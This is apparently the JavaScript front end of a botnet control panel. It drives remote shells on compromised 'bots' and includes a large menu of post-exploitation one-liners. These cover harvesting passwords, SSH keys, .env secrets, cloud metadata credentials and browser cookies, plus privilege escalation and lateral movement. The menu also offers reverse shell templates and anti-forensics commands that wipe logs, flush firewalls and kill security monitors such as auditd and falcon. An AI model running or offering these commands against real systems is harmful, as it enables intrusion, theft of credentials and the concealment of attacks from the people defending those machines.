  var blob = new Blob([content], { type: 'text/plain' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'shell_' + shellBotID + '_' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.txt';
  a.click(); URL.revokeObjectURL(a.href);
}

function clearShellHistory() {
  document.getElementById('shell-output').innerHTML = '';
  document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
  shellHistory = []; shellHistIdx = 0; shellCwd = '~'; shellCmdLog = [];
  document.getElementById('shell-prompt').textContent = '~$ ';
  updateBreadcrumb();
  if (shellBotID) delete shellSessions[shellBotID];
}

function shellZoom(delta) {
  _shellFontSize = Math.max(9, Math.min(22, _shellFontSize + delta));
  document.querySelectorAll('.shell-output').forEach(function (el) {
    el.style.fontSize = _shellFontSize + 'px';
  });
  localStorage.setItem('vision_shell_font_size', _shellFontSize);
}

function shellNetScan() {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var cmd = 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null';
  shellSendCmd(cmd);
}

function shellStartSocks() {
  if (!shellBotID) return;
  popupStartSocks(shellBotID);
}

// ---------------------------------------------------------------------------
// Toolkit — 100+ red-team one-liners in 16 categories
// ---------------------------------------------------------------------------

var toolkitItems = [
  { cat: 'Recon' },
  { name: 'Net Scan', cmd: 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
  { name: 'System Info', cmd: 'echo "=== HOSTNAME ===" && hostname && echo "=== KERNEL ===" && uname -a && echo "=== DISTRO ===" && cat /etc/*release 2>/dev/null | head -5 && echo "=== UPTIME ===" && uptime && echo "=== CPU ===" && nproc && echo "=== RAM ===" && free -h' },
  { name: 'Who / Users', cmd: 'echo "=== LOGGED IN ===" && w 2>/dev/null || who && echo "=== /etc/passwd (shells) ===" && grep -v nologin /etc/passwd | grep -v /false' },
  { name: 'Disk Usage', cmd: 'df -h 2>/dev/null && echo "=== MOUNTS ===" && mount | grep -v cgroup | grep -v proc' },
  { name: 'Running Procs', cmd: 'ps aux --sort=-%mem 2>/dev/null | head -25 || ps aux | head -25' },
  { name: 'Open Ports', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
  { name: 'DNS Config', cmd: 'cat /etc/resolv.conf 2>/dev/null && echo "=== HOSTS ===" && cat /etc/hosts' },
  { cat: 'Credentials' },
  { name: 'SSH Keys', cmd: 'echo "=== AUTHORIZED ===" && cat ~/.ssh/authorized_keys 2>/dev/null; for u in $(ls /home/); do echo "=== /home/$u ===" && cat /home/$u/.ssh/authorized_keys 2>/dev/null; done; echo "=== HOST KEYS ===" && ls -la /etc/ssh/ssh_host_* 2>/dev/null' },
  { name: 'Bash History', cmd: 'cat ~/.bash_history 2>/dev/null | tail -50; for u in $(ls /home/); do echo "=== $u ===" && cat /home/$u/.bash_history 2>/dev/null | tail -20; done' },
  { name: 'Passwd / Shadow', cmd: 'cat /etc/passwd && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null || echo "(no read access to shadow)"' },
  { name: 'Env / Secrets', cmd: 'env | grep -iE "pass|key|token|secret|api|auth|cred" 2>/dev/null; echo "=== .env files ===" && find / -name ".env" -readable 2>/dev/null | head -10' },
  { name: 'SSH Config', cmd: 'cat ~/.ssh/config 2>/dev/null; echo "=== Known Hosts ===" && cat ~/.ssh/known_hosts 2>/dev/null | head -20' },
  { name: 'WiFi Passwords', cmd: 'find /etc/NetworkManager/system-connections/ -name "*.nmconnection" 2>/dev/null | xargs grep -H psk= 2>/dev/null; cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -A3 "network=" | grep -E "ssid|psk"' },
  { name: 'History (all shells)', cmd: 'cat ~/.bash_history ~/.zsh_history ~/.ash_history ~/.history 2>/dev/null | grep -iE "pass|token|key|secret|curl.*-u|wget.*--password|mysql.*-p|sshpass" | sort -u | tail -30' },
  { name: 'Database Configs', cmd: 'cat /etc/mysql/debian.cnf 2>/dev/null; cat /etc/my.cnf 2>/dev/null | grep -i pass; cat /var/www/*/wp-config.php 2>/dev/null | grep -i "DB_"; find / -name "config.php" -path "*/phpmyadmin/*" 2>/dev/null | xargs grep -i "pass" 2>/dev/null | head -10' },
  { cat: 'Persistence' },
  { name: 'Crontabs', cmd: 'echo "=== ROOT CRONTAB ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/ 2>/dev/null' },
  { name: 'Systemd Services', cmd: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30 || ls /etc/init.d/ 2>/dev/null' },
  { name: 'Startup Files', cmd: 'cat /etc/rc.local 2>/dev/null; echo "=== PROFILE ===" && cat /etc/profile.d/*.sh 2>/dev/null | head -20; echo "=== BASHRC ===" && cat ~/.bashrc 2>/dev/null | tail -10' },
  { cat: 'Lateral Movement' },
  { name: 'ARP Neighbors', cmd: 'ip neigh 2>/dev/null || arp -a 2>/dev/null' },
  { name: 'Internal Hosts', cmd: 'cat /etc/hosts && echo "=== KNOWN SSH ===" && cat ~/.ssh/known_hosts 2>/dev/null | awk "{print \\$1}" | sort -u | head -20' },
  { name: 'Docker / LXC', cmd: 'echo "=== DOCKER ===" && docker ps -a 2>/dev/null || echo "(no docker)"; echo "=== LXC ===" && lxc list 2>/dev/null || echo "(no lxc)"; echo "=== CONTAINERS ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
  { name: 'Network Shares', cmd: 'echo "=== NFS ===" && showmount -e 127.0.0.1 2>/dev/null || echo "(no nfs)"; echo "=== SMB ===" && smbclient -L 127.0.0.1 -N 2>/dev/null || echo "(no smb)"; echo "=== FSTAB ===" && grep -v "^#" /etc/fstab 2>/dev/null' },
  { name: 'SSH Keys (all)', cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null | while read f; do echo "=== $f ==="; head -2 "$f" 2>/dev/null; echo ""; done | head -50' },
  { name: 'SSH Agent Sockets', cmd: 'find /tmp -name "agent.*" -type s 2>/dev/null; ls -la /tmp/ssh-* 2>/dev/null; echo "=== ENV ===" && env | grep SSH_AUTH_SOCK' },
  { name: 'Internal Subnets', cmd: 'ip route 2>/dev/null || route -n 2>/dev/null; echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null | grep inet | awk "{print \\$2}"' },
  { cat: 'Cloud' },
  { name: 'AWS IMDSv1', cmd: 'curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ && echo "" && echo "=== IDENTITY ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && echo "=== CREDS ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I{} curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/{}' },
  { name: 'AWS IMDSv2', cmd: 'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) && echo "Token: $TOKEN" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { name: 'GCP Metadata', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json" 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null' },
  { name: 'Azure IMDS', cmd: 'curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null; echo "=== MSI TOKEN ===" && curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null' },
  { name: 'Cloud Provider', cmd: 'echo "=== CHECKING ===" && curl -sf --connect-timeout 1 http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null && echo "AWS" || true; curl -sf --connect-timeout 1 -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>/dev/null && echo "GCP" || true; curl -sf --connect-timeout 1 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-01-01" 2>/dev/null && echo "Azure" || true' },
  { name: 'AWS CLI Keys', cmd: 'cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; find / -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'K8s Service Acct', cmd: 'echo "=== K8S TOKEN ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80; echo "" && echo "=== NAMESPACE ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "=== API SERVER ===" && env | grep -i kube' },
  { name: 'Container Escape', cmd: 'echo "=== PRIVILEGED ===" && cat /proc/self/status | grep -i cap; echo "=== DOCKER SOCKET ===" && ls -la /var/run/docker.sock 2>/dev/null || echo "(no docker socket)"; echo "=== HOST MOUNTS ===" && cat /proc/mounts | grep -v tmpfs | grep -v cgroup; echo "=== CGROUP ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
  { cat: 'Docker Recon' },
  { name: 'Docker Enumerate', cmd: 'echo "=== CONTAINERS ===" && docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}" 2>/dev/null; echo "=== IMAGES ===" && docker images --format "table {{.Repository}}\\t{{.Tag}}\\t{{.Size}}" 2>/dev/null; echo "=== NETWORKS ===" && docker network ls 2>/dev/null; echo "=== VOLUMES ===" && docker volume ls 2>/dev/null' },
  { name: 'Docker Secrets/Envs', cmd: 'for c in $(docker ps -q 2>/dev/null); do echo "=== CONTAINER: $c ==="; docker inspect $c 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -iE "Env|Secret|Password|Key|Token" | head -20; done' },
  { name: 'Docker via Socket', cmd: 'curl -sf --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E "Id|Image|Status|Names" | head -30 || echo "(no docker socket or no access)"' },
  { cat: 'Privesc' },
  { name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null | head -25' },
  { name: 'SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null | head -25' },
  { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20' },
  { name: 'Sudo Rights', cmd: 'sudo -l 2>/dev/null || echo "(sudo not available)"' },
  { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null | head -20 || echo "(getcap not found)"' },
  { name: 'World-Writable /etc', cmd: 'find /etc -writable -type f 2>/dev/null | head -20; echo "=== PASSWD WRITABLE ===" && [ -w /etc/passwd ] && echo "YES" || echo "no"' },
  { name: 'Cron Job Hijack', cmd: 'echo "=== WRITABLE CRON SCRIPTS ===" && find /etc/cron* /var/spool/cron -writable 2>/dev/null | head -10; echo "=== CRON PATH DIRS ===" && cat /etc/crontab 2>/dev/null | grep PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done' },
  { name: 'NFS no_root_squash', cmd: 'cat /etc/exports 2>/dev/null | grep -v "^#"; showmount -e 127.0.0.1 2>/dev/null' },
  { name: 'PATH Injection', cmd: 'echo "=== SUID w/ relative cmds ===" && find / -perm -4000 2>/dev/null | while read b; do strings "$b" 2>/dev/null | grep -E "^[a-z]+$" | grep -vE "^(lib|GLIBC)" | head -3 | while read c; do which "$c" >/dev/null 2>&1 || echo "$b calls: $c (not absolute!)"; done; done | head -20' },
  { cat: 'Exfil' },
  { name: 'Find Interesting Files', cmd: 'find / \\( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.bak" \\) -readable 2>/dev/null | grep -iE "pass|key|secret|token|cred|auth|db|database|config" | head -30' },
  { name: 'Dump .env Files', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | head -100' },
  { name: 'Source Code Secrets', cmd: 'find / \\( -name "*.py" -o -name "*.js" -o -name "*.php" -o -name "*.rb" -o -name "*.go" \\) -readable 2>/dev/null | xargs grep -liE "password|api_key|secret_key|access_token|private_key|aws_secret" 2>/dev/null | head -20' },
  { name: 'Private Keys', cmd: 'find / \\( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" \\) -readable 2>/dev/null | head -20' },
  { name: 'DB Files (SQLite)', cmd: 'find / \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdb" \\) -readable 2>/dev/null | head -20' },
  { name: 'Git Config / Tokens', cmd: 'find / -name ".gitconfig" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -name ".git-credentials" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -path "*/.config/gh/hosts.yml" -readable 2>/dev/null | xargs cat 2>/dev/null' },
  { name: 'Cloud Creds (all)', cmd: 'echo "=== AWS ===" && cat ~/.aws/credentials 2>/dev/null; echo "=== GCP ===" && cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null | head -20; echo "=== Azure ===" && cat ~/.azure/accessTokens.json 2>/dev/null | head -20; echo "=== DO ===" && cat ~/.config/doctl/config.yaml 2>/dev/null | grep token' },
  { name: 'Browser Sessions', cmd: 'find /home /root \\( -name "cookies.sqlite" -o -name "Cookies" -o -name "Login Data" -o -name "logins.json" -o -name "key4.db" \\) 2>/dev/null' },
  { cat: 'Mining Recon' },
  { name: 'Active Miners', cmd: 'ps aux 2>/dev/null | grep -iE "xmrig|minerd|cgminer|bfgminer|ethminer|nbminer|lolminer|t-rex|gminer|cpuminer|cryptonight|monero" | grep -v grep; ls /tmp/.* /var/tmp/.* 2>/dev/null | grep -iE "xmr|mine|crypt" | head -10' },
  { name: 'Cron Miners', cmd: 'crontab -l 2>/dev/null | grep -iE "wget|curl|bash|sh -c|xmr|mine"; grep -r "wget\\|curl" /etc/cron* /var/spool/cron 2>/dev/null | grep -iE "base64|xmr|mine|\\.sh" | head -10' },
  { name: 'Pool Connections', cmd: 'ss -tn state established 2>/dev/null | awk \'{print $5}\' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20; ss -tp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444|3333|5555|7777" | head -15' },
  { name: 'Installed Miners', cmd: 'which xmrig xmr-stak cpuminer bfgminer cgminer ethminer nbminer lolminer t-rex gminer 2>/dev/null; find /tmp /var/tmp /dev/shm -executable -type f 2>/dev/null | head -10' },
  { name: 'Resource Spike', cmd: 'echo "=== Top CPU ===" && ps aux --sort=-%cpu 2>/dev/null | head -10; echo "=== Load Average ===" && uptime; echo "=== Memory ===" && free -h' },
  { name: 'LD Preload', cmd: 'cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD SET" || echo "(no preload)"; echo "=== LD_PRELOAD ENV ===" && env | grep LD_' },
  { cat: 'CMS / Web Panels' },
  { name: 'WordPress Config', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "DB_|table_prefix|secret_key|AUTH_KEY" "$f" 2>/dev/null; done | head -60' },
  { name: 'Joomla Config', cmd: 'find / -name "configuration.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "\\$db|\\$password|\\$user|\\$secret|\\$host" "$f" 2>/dev/null; done | head -60' },
  { name: 'Drupal Config', cmd: 'find / \\( -name "settings.php" -o -name "settings.local.php" \\) -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "database|username|password|host|driver" "$f" 2>/dev/null; done | head -60' },
  { name: 'Laravel .env', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -iE "DB_|MAIL_|AWS_|APP_KEY|SECRET|TOKEN|PASSWORD" "$f" 2>/dev/null; done | head -80' },
  { name: 'cPanel Users', cmd: 'ls /var/cpanel/users/ 2>/dev/null | head -30; cat /etc/trueuserdomains 2>/dev/null | head -20; ls /home/ 2>/dev/null' },
  { name: 'Web Server Configs', cmd: 'find /etc/nginx /etc/apache2 /etc/httpd -name "*.conf" -readable 2>/dev/null | xargs grep -liE "password|secret|auth_basic|ssl_certificate_key" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pass|secret|key" | head -30' },
  { name: 'Database Dumps', cmd: 'find / -name "*.sql" -o -name "*.sql.gz" -o -name "*.dump" 2>/dev/null | head -20; find /var/www /home /srv -name "backup*" -type f 2>/dev/null | head -10' },
  { cat: 'IoT / Embedded' },
  { name: 'Firmware Info', cmd: 'cat /etc/openwrt_release 2>/dev/null || cat /etc/firmware_version 2>/dev/null; strings /dev/mtdblock0 2>/dev/null | head -20' },
  { name: 'BusyBox Check', cmd: 'busybox 2>&1 | head -3; ls /bin/busybox /usr/bin/busybox 2>/dev/null' },
  { name: 'GPIO / Serial', cmd: 'ls /dev/tty* /dev/gpio* 2>/dev/null | head -20' },
  { name: 'Router Config', cmd: 'nvram show 2>/dev/null | grep -iE "pass|key|ssid|wan" | head -20; cat /etc/config/wireless 2>/dev/null | head -30' },
  { name: 'MTD Partitions', cmd: 'cat /proc/mtd 2>/dev/null; ls -la /dev/mtd* 2>/dev/null | head -20' },
  { cat: 'Network Attacks' },
  { name: 'Ping Sweep', cmd: 'SUBNET=$(ip route 2>/dev/null | grep -v default | grep src | head -1 | awk "{print \\$1}"); echo "Sweeping $SUBNET"; for i in $(seq 1 254); do IP="${SUBNET%.*}.$i"; (ping -c1 -W1 $IP &>/dev/null && echo "ALIVE: $IP") & done; wait; echo "done"' },
  { name: 'Port Scan (common)', cmd: 'TARGET=${1:-127.0.0.1}; echo "Scanning $TARGET"; for p in 21 22 23 25 53 80 110 443 445 3306 3389 5432 5900 6379 8080 8443 9200 27017; do (echo >/dev/tcp/$TARGET/$p 2>/dev/null && echo "OPEN: $p") & done; wait' },
  { name: 'Established Conns', cmd: 'ss -tnp state established 2>/dev/null | head -40 || netstat -tnp 2>/dev/null | grep ESTABLISHED | head -40' },
  { name: 'Firewall Rules', cmd: 'echo "=== IPTABLES ===" && iptables -L -n -v 2>/dev/null | head -40 || echo "(no iptables)"; echo "=== NFTABLES ===" && nft list ruleset 2>/dev/null | head -30 || echo "(no nft)"; echo "=== UFW ===" && ufw status verbose 2>/dev/null || echo "(no ufw)"' },
  { name: 'WiFi Networks', cmd: 'iwlist scan 2>/dev/null | grep -E "ESSID|Signal|Channel" | head -30 || iw dev 2>/dev/null && iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" | head -30' },
  { cat: 'Anti-Forensics' },
  { name: 'Process Hiding', cmd: 'echo "=== DELETED BINARIES ===" && find /proc/*/exe -type l 2>/dev/null | xargs ls -la 2>/dev/null | grep deleted | head -10; echo "=== HIDDEN FILES ===" && find / -name ".*" -type f 2>/dev/null | grep -iE "xmr|mine|hack|shell|back|root" | head -10' },
  { name: 'Rootkit Check', cmd: 'echo "=== LD PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD ACTIVE" || echo "(clean)"; echo "=== LKM ===" && lsmod 2>/dev/null | head -20' },
  { name: 'Kernel Modules', cmd: 'lsmod 2>/dev/null | head -30; echo "=== RECENTLY LOADED ===" && dmesg 2>/dev/null | grep -iE "module|insmod|loaded" | tail -10' },
  { cat: 'Util' },
  { name: 'Arch + Libc', cmd: 'uname -m && file /bin/ls 2>/dev/null && ldd --version 2>&1 | head -1; cat /proc/version' },
  { name: 'Available Tools', cmd: 'for t in wget curl python3 python perl ruby php gcc cc nmap socat nc ncat netcat openssl ssh scp rsync busybox docker kubectl gdb strace ltrace tcpdump; do which $t 2>/dev/null && echo "  ok $t"; done' },
  { name: 'File Download (curl)', cmd: 'echo "curl -sfLO http://YOUR_SERVER/file"; echo "wget -q http://YOUR_SERVER/file"' },
  { name: 'Reverse Shell Cmds', cmd: 'IP="YOUR_IP"; PORT="YOUR_PORT"; echo "=== BASH ===" && echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"; echo "=== PYTHON ===" && echo "python3 -c \\"import os,pty,socket;s=socket.socket();s.connect((\\x27$IP\\x27,$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\x27/bin/sh\\x27)\\""; echo "=== NC ===" && echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"' },
  { name: 'Disk / Inode Usage', cmd: 'df -h 2>/dev/null; echo "=== INODES ===" && df -i 2>/dev/null | grep -v "Filesystem" | awk \'$5+0 > 50{print}\'; echo "=== BIG FILES ===" && find / -type f -size +100M 2>/dev/null | head -15' },
  { name: 'Last Logins', cmd: 'last -20 2>/dev/null || lastlog 2>/dev/null | grep -v "Never" | head -20; echo "=== FAILED ===" && lastb 2>/dev/null | head -10 || grep -i "failed" /var/log/auth.log 2>/dev/null | tail -10' },
  { name: 'SELinux / AppArmor', cmd: 'echo "=== SELINUX ===" && getenforce 2>/dev/null || sestatus 2>/dev/null || echo "(no selinux)"; echo "=== APPARMOR ===" && aa-status 2>/dev/null || cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo "(no apparmor)"; echo "=== SECCOMP ===" && grep Seccomp /proc/self/status 2>/dev/null' },
  { cat: 'Cleanup' },
  { name: 'Clear Logs', cmd: 'echo > /var/log/auth.log 2>/dev/null; echo > /var/log/syslog 2>/dev/null; echo > /var/log/wtmp 2>/dev/null; echo > ~/.bash_history; history -c; echo "logs cleared"' },
  { name: 'Kill Traces', cmd: 'unset HISTFILE && export HISTSIZE=0 && echo "history disabled for session"' },
  { name: 'Wipe Temp', cmd: 'rm -rf /tmp/.* /tmp/* 2>/dev/null; rm -rf /var/tmp/.* 2>/dev/null; echo "tmp wiped"' },
  { name: 'Zero Wtmp/Utmp', cmd: '> /var/log/wtmp 2>/dev/null; > /var/log/utmp 2>/dev/null; > /var/log/lastlog 2>/dev/null; echo "login logs zeroed"' },
  { name: 'Flush Firewall', cmd: 'iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT && echo "firewall flushed"' },
  { name: 'Kill Monitors', cmd: "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig' 2>/dev/null; echo 'done'" },
];

function buildToolkitMenu() {
  var body = document.getElementById('toolkit-grid-body');
  if (!body) return;
  var q = ((document.getElementById('toolkit-search') || {}).value || '').toLowerCase();
  var sections = [], cur = null;
  for (var i = 0; i < toolkitItems.length; i++) {
    var t = toolkitItems[i];
    if (t.cat) { cur = { cat: t.cat, items: [] }; sections.push(cur); }
    else if (cur) cur.items.push({ idx: i, name: t.name, cmd: t.cmd });
  }
  var html = '';
  sections.forEach(function (sec) {
    var items = q
      ? sec.items.filter(function (it) { return it.name.toLowerCase().indexOf(q) !== -1 || it.cmd.toLowerCase().indexOf(q) !== -1; })
      : sec.items;
    if (!items.length) return;
    html += '<div class="toolkit-section">';
    html += '<div class="toolkit-section-header">' + escHtml(sec.cat) + '</div>';
    html += '<div class="toolkit-section-grid">';
    items.forEach(function (it) {
      var prev = it.cmd.length > 55 ? it.cmd.slice(0, 55) + '…' : it.cmd;
      html += '<div class="toolkit-item" onclick="runToolkitItem(' + it.idx + ')" title="' + escHtml(it.cmd) + '">' +
        '<div class="toolkit-item-name">' + escHtml(it.name) + '</div>' +
        '<div class="toolkit-item-preview">' + escHtml(prev) + '</div></div>';
    });
    html += '</div></div>';
  });
  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">No matches</div>';
}

function toggleToolkit() {
  var menu = document.getElementById('shell-toolkit-menu');
  if (menu.classList.contains('open')) {
    menu.classList.remove('open');
    document.removeEventListener('click', _closeToolkitOutside);
  } else {
    buildToolkitMenu();
    menu.classList.add('open');
    setTimeout(function () { document.addEventListener('click', _closeToolkitOutside); }, 0);
  }
}

function _closeToolkitOutside(e) {
  var wrap = document.getElementById('shell-toolkit-wrap');
  if (wrap && !wrap.contains(e.target)) {
    document.getElementById('shell-toolkit-menu').classList.remove('open');
    document.removeEventListener('click', _closeToolkitOutside);
  }
}

function runToolkitItem(idx) {
  var t = toolkitItems[idx];
  if (!t || !t.cmd) return;
  document.getElementById('shell-toolkit-menu').classList.remove('open');
  document.removeEventListener('click', _closeToolkitOutside);
  shellSendCmd(t.cmd);
}

// ---------------------------------------------------------------------------
// Shell input handler
// ---------------------------------------------------------------------------

document.getElementById('shell-input').addEventListener('keydown', function (e) {
  if (e.key === 'Tab') {
    e.preventDefault();
    if (tcMatches.length > 0) {
      selectTabComplete(tcIdx >= 0 ? tcIdx : 0);
    } else {
      showTabComplete(this);
    }
    return;
  }

  if (e.key === 'Enter') {
    hideTabComplete();
    var cmd = this.value.trim();
    if (!cmd || !shellWS) return;
    var p = document.getElementById('shell-prompt').textContent;
    appendOutput(p + ' ' + cmd + '\n');
    shellWS.send(JSON.stringify({ command: cmd }));

    // Track cd for prompt
    if (cmd.match(/^cd(\s|$)/)) {
      var d = cmd.replace(/^cd\s*/, '').trim();
      if (!d || d === '~') { shellCwd = '~'; }
      else if (d.match(/^\//)) { shellCwd = d; }
      else if (d === '..') {
        if (shellCwd === '~' || shellCwd === '/') { }
        else { var parts = shellCwd.split('/'); parts.pop(); shellCwd = parts.join('/') || '/'; }
      } else { shellCwd = (shellCwd === '~' ? '~' : shellCwd) + '/' + d; }
      document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
      updateBreadcrumb();
      setTimeout(function () { refreshFiles(); }, 300);
    }

    shellHistory.push(cmd);
    shellCmdLog.push({ ts: Date.now(), cmd: cmd });
    shellHistIdx = shellHistory.length;
    this.value = '';
  } else if ((e.key === '=' || e.key === '+') && e.ctrlKey) {
    e.preventDefault(); shellZoom(+1);
  } else if (e.key === '-' && e.ctrlKey) {
    e.preventDefault(); shellZoom(-1);
  } else if (e.key === 'ArrowUp') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(-1); return; }
    e.preventDefault();
    if (shellHistIdx > 0) { shellHistIdx--; this.value = shellHistory[shellHistIdx]; }
  } else if (e.key === 'ArrowDown') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(1); return; }
    e.preventDefault();
    if (shellHistIdx < shellHistory.length - 1) { shellHistIdx++; this.value = shellHistory[shellHistIdx]; }
    else { shellHistIdx = shellHistory.length; this.value = ''; }
  } else if (e.key === 'Escape') {
    if (tcMatches.length) { hideTabComplete(); return; }
    closeShell();
  } else {
    // Auto-show tab completion for ! prefix
    setTimeout(function () {
      var v = document.getElementById('shell-input').value;
      if (v.startsWith('!') && v.length > 0) showTabComplete(document.getElementById('shell-input'));
      else hideTabComplete();
    }, 0);
  }
});

// ---------------------------------------------------------------------------
// Keyboard shortcuts
// ---------------------------------------------------------------------------

function toggleHelp() {
  var ov = document.getElementById('help-overlay');
  ov.classList.toggle('open');
}

document.addEventListener('keydown', function (e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') return;
  if (e.key === '?') { e.preventDefault(); toggleHelp(); return; }
  if (e.key === 's' || e.key === '/') {
    e.preventDefault();
    var botsTab = document.querySelector('[data-tab="tab-bots"]');
    if (botsTab && !botsTab.classList.contains('active')) switchTab(botsTab);
    document.getElementById('bot-search').focus();
  }
  if (e.key >= '1' && e.key <= '6') {
    var tabs = ['tab-bots', 'tab-socks', 'tab-attack', 'tab-activity', 'tab-tasks', 'tab-users'];
    var tab = document.querySelector('[data-tab="' + tabs[parseInt(e.key) - 1] + '"]');
    if (tab) switchTab(tab);
  }
  if (e.key === 'Escape') {
    var helpOv = document.getElementById('help-overlay');
    if (helpOv && helpOv.classList.contains('open')) { toggleHelp(); return; }
    closeShell(); closeBotPopup();
    var ov = document.getElementById('relay-picker-overlay'); if (ov) ov.remove();
    var nd = document.getElementById('notif-drawer');
    if (nd.classList.contains('open')) toggleNotifs();
  }
});

// ---------------------------------------------------------------------------
// Column Sorting
// ---------------------------------------------------------------------------

var sortField = '', sortAsc = true;

function sortBots(field) {
  if (sortField === field) { sortAsc = !sortAsc; }
  else { sortField = field; sortAsc = true; }

  // Update arrow indicators
  document.querySelectorAll('.sort-arrow').forEach(function (el) { el.textContent = ''; });
  var arrow = document.getElementById('sort-' + field);
  if (arrow) arrow.textContent = sortAsc ? '\u25B2' : '\u25BC';

  // Sort the bots array and re-render
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr.slice();
  bots.sort(function (a, b) {
    var va = a[field], vb = b[field];
    // Handle group field
    if (field === 'group') { va = va || ''; vb = vb || ''; }
    // Numeric fields
    if (typeof va === 'number' && typeof vb === 'number') {
